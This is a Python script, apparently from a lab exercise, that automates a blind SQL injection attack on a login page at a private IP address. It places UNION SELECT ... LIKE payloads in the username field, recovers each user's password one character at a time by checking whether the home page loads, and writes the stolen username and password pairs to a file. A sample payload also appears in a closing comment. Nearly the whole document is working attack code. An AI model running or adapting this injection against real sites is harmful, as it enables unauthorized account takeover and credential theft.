import mechanize
import string
import requests


POSSIBLE_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
possibleChars = list(POSSIBLE_CHARS)
URL = 'http://10.14.4.14/users/login.php'
userlist =[]
passwordlist = []

def part_pass(user, password):
	
    br = mechanize.Browser()
#open login page
    br.open("http://10.14.4.14/users/login.php")
#retrieve second form (ie form to fill out
    br.form=list(br.forms())[1]
    request = "' UNION SELECT * FROM users WHERE login LIKE '"+ user + "' AND password LIKE \'" + password +"%\' ;#"
#test SQL INJECTION CODE in the form username field
    br.form['username'] = request
    br.submit()
#try open home page as user
    br.open("http://10.14.4.14/users/home.php")
    newurl = "http://10.14.4.14/users/home.php"
    url = br.geturl()
#if successfully opened home page as user (we have logged in)
    if newurl==url: 
	br.open("http://10.14.4.14/users/logout.php")
    	return True
    return False


def password(user,password,i):	
	x =0
	while i<len(possibleChars):
		c=possibleChars[i]
		br = mechanize.Browser()
#send to part_pass to test if part of the password is correct
		if (part_pass(user,password + possibleChars[i]) == True):
			i = 0;
			password += c
			br.open("http://10.14.4.14/users/login.php")
			br.form=list(br.forms())[1]
			request = "' UNION SELECT * FROM users WHERE login LIKE '"+ user + "' AND password LIKE '" + password +"' ;#"
#test to see if the password has been completed
			br.form['username'] = request
			br.submit()
			br.open("http://10.14.4.14/users/home.php")
			newurl = "http://10.14.4.14/users/home.php"
			url = br.geturl()
			if newurl==url: 
				br.open("http://10.14.4.14/users/logout.php")	
#write out the users username and password 
				file.write(user+"\t"+password+"\n")				
				print user,password

		else:
			i=i+1	
	return userlist
#ed139fcc14130348d9deec1d4c7041160bafdff9
#br = mechanize.Browser()
#br.open("http://10.14.4.14/users/login.php")
#br.form=list(br.forms())[1]
i=0
file= open("Usernames&Passwords.txt","w+")
file.write('Username \t  Password \n')
lines = [line.rstrip('\n') for line in open('Usernames.txt')]
for x in lines:
	tup = x.split("=")
	myUsername= tup[1]
	password(myUsername,'',0)	
file.close()
	

#' UNION SELECT * FROM users WHERE login LIKE 'adam' AND password LIKE 'a%' ;#